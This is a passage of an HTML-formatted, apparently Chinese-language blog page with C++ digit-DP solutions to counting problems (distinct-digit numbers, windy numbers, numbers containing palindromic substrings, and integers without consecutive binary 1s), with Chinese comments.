<span class="hljs-number">10</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// cnt[i] : 一共长度为len，还剩i位没有确定，确定的前缀为len-i位，且确定的前缀不为空</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">cnt</span><span class="hljs-params">(len)</span>;<br>    cnt[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>, k = <span class="hljs-number">10</span> - len + <span class="hljs-number">1</span>; i &lt; len; i++, k++) &#123;<br>        cnt[i] = cnt[i - <span class="hljs-number">1</span>] * k;<br>    &#125;<br>    <br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (len &gt;= <span class="hljs-number">2</span>) &#123;<br>        ans = <span class="hljs-number">9</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>, a = <span class="hljs-number">9</span>, b = <span class="hljs-number">9</span>; i &lt; len; i++, b--) &#123;<br>            a *= b;<br>            ans += a;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">int</span> first = n / offset;<br>    <span class="hljs-comment">// 小于num最高位数字的情况</span><br>    ans += (first - <span class="hljs-number">1</span>) * cnt[len - <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">// 后续累加上，等于num最高位数字的情况</span><br>    ans += f(cnt, n, len - <span class="hljs-number">1</span>, offset / <span class="hljs-number">10</span>, <span class="hljs-number">1</span> &lt;&lt; first);<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-comment">// 之前已经确定了和num一样的前缀，且确定的部分一定不为空</span><br><span class="hljs-comment">// 还有len位没有确定</span><br><span class="hljs-comment">// 哪些数字已经选了，哪些数字没有选，用status表示</span><br><span class="hljs-comment">// 返回&lt;=num且每一位数字都不一样的正整数有多少个</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; cnt, <span class="hljs-type">int</span> num, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> offset, <span class="hljs-type">int</span> status)</span> &#123;<br>    <span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> first = (num / offset) % <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cur = <span class="hljs-number">0</span>; cur &lt; first; cur++) &#123;<br>        <span class="hljs-keyword">if</span> ((status &amp; (<span class="hljs-number">1</span> &lt;&lt; cur)) == <span class="hljs-number">0</span>) &#123;<br>            ans += cnt[len - <span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((status &amp; (<span class="hljs-number">1</span> &lt;&lt; first)) == <span class="hljs-number">0</span>) &#123;<br>        ans += f(cnt, num, len - <span class="hljs-number">1</span>, offset / <span class="hljs-number">10</span>, status | (<span class="hljs-number">1</span> &lt;&lt; first));<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">numDupDigitsAtMostN</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-keyword">return</span> n - countSpecialNumbers(n);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">100</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Result: &quot;</span> &lt;&lt; numDupDigitsAtMostN(n) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="windy数"><a href="#windy数" class="headerlink" title="windy数"></a>windy数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXLEN = <span class="hljs-number">11</span>;<br><span class="hljs-type">int</span> dp[MAXLEN][<span class="hljs-number">11</span>][<span class="hljs-number">2</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">build</span><span class="hljs-params">(<span class="hljs-type">int</span> len)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= len; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">10</span>; j++) &#123;<br>            dp[i][j][<span class="hljs-number">0</span>] = <span class="hljs-number">-1</span>;<br>            dp[i][j][<span class="hljs-number">1</span>] = <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">int</span> num, <span class="hljs-type">int</span> offset, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> pre, <span class="hljs-type">int</span> <span class="hljs-built_in">free</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (dp[len][pre][<span class="hljs-built_in">free</span>] != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> dp[len][pre][<span class="hljs-built_in">free</span>];<br>    &#125;<br>    <span class="hljs-type">int</span> cur = num / offset % <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">free</span> == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (pre == <span class="hljs-number">10</span>) &#123;<br>            <span class="hljs-comment">// 之前的位和num一样，此时不能随意选择数字</span><br>            <span class="hljs-comment">// 也从来没有选择过数字</span><br>            <span class="hljs-comment">// 就表示：来到的是num的最高位</span><br>            ans += f(num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">// 一个数字也不要</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; cur; i++) &#123;<br>                ans += f(num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, i, <span class="hljs-number">1</span>);<br>            &#125;<br>            ans += f(num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, cur, <span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 之前的位和num一样，此时不能随意选择数字，</span><br>            <span class="hljs-comment">// 之前选择过数字pre</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (i &lt;= pre - <span class="hljs-number">2</span> || i &gt;= pre + <span class="hljs-number">2</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (i &lt; cur) &#123;<br>                        ans += f(num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, i, <span class="hljs-number">1</span>);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == cur) &#123;<br>                        ans += f(num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, cur, <span class="hljs-number">0</span>);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (pre == <span class="hljs-number">10</span>) &#123;<br>            <span class="hljs-comment">// free == 1，可以自由选择数字，前面的状况 &lt; num</span><br>            <span class="hljs-comment">// 从来没有选择过数字</span><br>            ans += f(num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">// 还是可以不选择数字</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">9</span>; i++) &#123;<br>                ans += f(num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, i, <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// free == 1，可以自由选择数字，前面的状况 &lt; num</span><br>            <span class="hljs-comment">// 选择过数字pre</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (i &lt;= pre - <span class="hljs-number">2</span> || i &gt;= pre + <span class="hljs-number">2</span>) &#123;<br>                    ans += f(num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, i, <span class="hljs-number">1</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    dp[len][pre][<span class="hljs-built_in">free</span>] = ans;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">cnt</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> &#123;<br>    <span class="hljs-keyword">if</span> (num == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> offset = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> tmp = num / <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">while</span> (tmp &gt; <span class="hljs-number">0</span>) &#123;<br>        len++;<br>        offset *= <span class="hljs-number">10</span>;<br>        tmp /= <span class="hljs-number">10</span>;<br>    &#125;<br>    build(len);<br>    <span class="hljs-keyword">return</span> f(num, offset, len, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">compute</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>    <span class="hljs-keyword">return</span> cnt(b) - cnt(a - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> a, b;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">cin</span> &gt;&gt; a &gt;&gt; b) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; compute(a, b) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="萌数"><a href="#萌数" class="headerlink" title="萌数"></a>萌数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MOD = <span class="hljs-number">1000000007</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">1001</span>;<br><br><span class="hljs-type">int</span> dp[MAXN][<span class="hljs-number">11</span>][<span class="hljs-number">11</span>][<span class="hljs-number">2</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">build</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> a = <span class="hljs-number">0</span>; a &lt; n; a++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> b = <span class="hljs-number">0</span>; b &lt;= <span class="hljs-number">10</span>; b++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> c = <span class="hljs-number">0</span>; c &lt;= <span class="hljs-number">10</span>; c++) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> d = <span class="hljs-number">0</span>; d &lt;= <span class="hljs-number">1</span>; d++) &#123;<br>                    dp[a][b][c][d] = <span class="hljs-number">-1</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; num, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> pp, <span class="hljs-type">int</span> p, <span class="hljs-type">int</span> <span class="hljs-built_in">free</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i == num.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (dp[i][pp][p][<span class="hljs-built_in">free</span>] != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> dp[i][pp][p][<span class="hljs-built_in">free</span>];<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">free</span> == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (p == <span class="hljs-number">10</span>) &#123;<br>            <span class="hljs-comment">// 当前来到的就是num的最高位</span><br>            ans = (ans + f(num, i + <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>)) % MOD; <span class="hljs-comment">// 当前位不选数字</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cur = <span class="hljs-number">1</span>; cur &lt; num[i] - <span class="hljs-string">&#x27;0&#x27;</span>; cur++) &#123;<br>                ans = (ans + f(num, i + <span class="hljs-number">1</span>, p, cur, <span class="hljs-number">1</span>)) % MOD;<br>            &#125;<br>            ans = (ans + f(num, i + <span class="hljs-number">1</span>, p, num[i] - <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-number">0</span>)) % MOD;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// free == 0，之前和num一样，此时不能自由选择数字</span><br>            <span class="hljs-comment">// 前一位p，选择过数字，p -&gt; 0 ~ 9</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cur = <span class="hljs-number">0</span>; cur &lt; num[i] - <span class="hljs-string">&#x27;0&#x27;</span>; cur++) &#123;<br>                <span class="hljs-keyword">if</span> (pp != cur &amp;&amp; p != cur) &#123;<br>                    ans = (ans + f(num, i + <span class="hljs-number">1</span>, p, cur, <span class="hljs-number">1</span>)) % MOD;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (pp != num[i] - <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; p != num[i] - <span class="hljs-string">&#x27;0&#x27;</span>) &#123;<br>                ans = (ans + f(num, i + <span class="hljs-number">1</span>, p, num[i] - <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-number">0</span>)) % MOD;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (p == <span class="hljs-number">10</span>) &#123;<br>            <span class="hljs-comment">// free == 1，能自由选择数字</span><br>            <span class="hljs-comment">// 从来没选过数字</span><br>            ans = (ans + f(num, i + <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>)) % MOD; <span class="hljs-comment">// 依然不选数字</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cur = <span class="hljs-number">1</span>; cur &lt;= <span class="hljs-number">9</span>; cur++) &#123;<br>                ans = (ans + f(num, i + <span class="hljs-number">1</span>, p, cur, <span class="hljs-number">1</span>)) % MOD;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// free == 1，能自由选择数字</span><br>            <span class="hljs-comment">// 之前选择过数字</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cur = <span class="hljs-number">0</span>; cur &lt;= <span class="hljs-number">9</span>; cur++) &#123;<br>                <span class="hljs-keyword">if</span> (pp != cur &amp;&amp; p != cur) &#123;<br>                    ans = (ans + f(num, i + <span class="hljs-number">1</span>, p, cur, <span class="hljs-number">1</span>)) % MOD;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    dp[i][pp][p][<span class="hljs-built_in">free</span>] = ans;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">check</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; num)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> pp = <span class="hljs-number">-2</span>, p = <span class="hljs-number">-1</span>, i = <span class="hljs-number">0</span>; i &lt; num.size(); pp++, p++, i++) &#123;<br>        <span class="hljs-keyword">if</span> (pp &gt;= <span class="hljs-number">0</span> &amp;&amp; num[pp] == num[i]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (p &gt;= <span class="hljs-number">0</span> &amp;&amp; num[p] == num[i]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">cnt</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; num)</span> &#123;<br>    <span class="hljs-keyword">if</span> (num[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;0&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> n = num.size();<br>    <span class="hljs-type">long</span> all = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> base = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        all = (all + base * (num[i] - <span class="hljs-string">&#x27;0&#x27;</span>)) % MOD;<br>        base = (base * <span class="hljs-number">10</span>) % MOD;<br>    &#125;<br>    build(n);<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">int</span>) ((all - f(num, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>) + MOD) % MOD);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">compute</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; l, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; r)</span> &#123;<br>    <span class="hljs-type">int</span> ans = (cnt(r) - cnt(l) + MOD) % MOD;<br>    <span class="hljs-keyword">if</span> (check(l)) &#123;<br>        ans = (ans + <span class="hljs-number">1</span>) % MOD;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">string</span> l, r;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; l &gt;&gt; r;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">l_vec</span><span class="hljs-params">(l.begin(), l.end())</span>;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">r_vec</span><span class="hljs-params">(r.begin(), r.end())</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; compute(l_vec, r_vec) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="不含连续1的非负整数"><a href="#不含连续1的非负整数" class="headerlink" title="不含连续1的非负整数"></a>不含连续1的非负整数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 给定一个正整数n，请你统计在[0, n]范围的非负整数中</span><br><span class="hljs-comment">// 有多少个整数的二进制表示中不存在连续的1</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">findIntegers1</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">cnt</span><span class="hljs-params">(<span class="hljs-number">31</span>)</span>;<br>    cnt[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    cnt[<span class="hljs-number">1</span>] = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> len = <span class="hljs-number">2</span>; len &lt;= <span class="hljs-number">30</span>; len++) &#123;<br>        cnt[len] = cnt[len - <span class="hljs-number">1</span>] + cnt[len - <span class="hljs-number">2</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> f(cnt, n, <span class="hljs-number">30</span>);<br>&#125;<br><br><span class="hljs-comment">// cnt[len] : 